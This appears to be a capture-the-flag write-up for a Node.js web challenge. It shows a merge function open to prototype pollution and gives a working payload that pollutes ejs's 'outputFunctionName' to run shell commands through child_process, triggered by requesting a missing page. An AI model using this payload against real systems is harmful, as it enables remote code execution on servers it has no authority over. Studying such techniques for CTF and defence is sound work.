## Crypto Tracker (148 pts)

1. Given attachment

```
├── app
│   ├── app.js
│   ├── flag.txt
│   ├── package.json
│   ├── package-lock.json
│   ├── routes
│   │   ├── errors.js
│   │   └── index.js
│   ├── utils.js
│   └── views
│       ├── error.html
│       └── index.html
├── docker-compose.yml
└── Dockerfile
```

2. merge function vulnerable to prototype pollution

app/utils.js

```
function merge (dst, ...sources) {
    for (src of sources) {
        for (let key in src) {
            let s = src[key], d = dst[key]
            if (Object(s) == s && Object(d) === d) {
                dst[key] = merge(d, s)
                continue
            }
            dst[key] = src[key]
        }
    }
    return dst
}
```
3. application using `ejs` module, we could use this module as gadget to gain RCE.
4. `ejs` module only called when application is error.
5. Pollute module `ejs` -> trigger module ejs with visitting non exist endpoint

payload : 
1. Polluting module `ejs` and replacing `index.html` with our payload
```
POST /crypto HTTP/1.1
Host: 13.212.74.56:3000
8< snip - snip >8

{
    "cryptos": [
        "bitcoin"
    ],
    "options": {
        "constructor": {
            "prototype": {
                "outputFunctionName": "x;process.mainModule.require('child_process').exec('ls / > /opt/ctf/app/views/index.html');x"
            }
        }
    }
}
```
2. Access non exist endpoint to trigger the `ejs` module
```
GET /nyx HTTP/1.1
Host: 13.212.74.56:3000
8< snip - snip >8
```


